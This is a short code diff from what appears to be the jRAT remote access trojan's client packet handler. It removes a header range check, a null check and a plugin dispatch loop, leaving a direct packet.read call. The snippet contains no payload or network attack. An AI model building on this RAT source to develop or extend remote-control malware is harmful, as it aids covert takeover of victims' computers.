@@ -1,10 +1,7 @@
 package jrat.client.packets.incoming;
 
-import jrat.common.PacketRange;
 import jrat.client.Connection;
-import jrat.client.Plugin;
 
-import java.util.HashMap;
 import java.util.Set;
 
 
@@ -22,13 +19,7 @@ public abstract class AbstractIncomingPacket {
 				}
 			}
 			
-			if (packet != null && header >= 0 && header <= PacketRange.RANGE_STUB_INCOMING) {
-				packet.read(con);
-			} else {
-				for (Plugin p : Plugin.list) {
-					p.methods.get("onpacket").invoke(p.instance, header);
-				}
-			}
+            packet.read(con);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
